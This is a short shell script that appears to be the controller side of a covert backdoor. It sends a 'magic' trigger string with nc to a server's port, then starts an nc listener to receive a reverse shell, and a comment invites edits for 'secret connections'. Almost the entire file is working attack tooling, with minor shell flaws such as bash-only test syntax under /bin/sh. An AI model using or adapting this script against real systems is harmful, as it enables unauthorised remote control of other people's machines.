#!/bin/sh

MAGIC="change this magic string"
SERVER_HOST="localhost"
SERVER_MAGIC_PORT=8080

echo "Sending magic packet to $SERVER_HOST:$SERVER_MAGIC_PORT"

# You can edit the nc command, and impliment logic for successful secret connections.
REVERSE_SHELL_CONNECT_PORT=8081
echo "$MAGIC" | nc -vvv -n $SERVER_HOST $SERVER_MAGIC_PORT -w 0 && echo "Magic sent..."
if [[ $? -eq 1 ]]; then
    echo "Failed to connect to the host."
    exit 1 
fi
 
echo "Success."
echo "Starting to reverse shell listener on port $REVERSE_SHELL_CONNECT_PORT..."
nc -vvv -l -s $SERVER_HOST -p $REVERSE_SHELL_CONNECT_PORT && echo "Exited reverse shell"
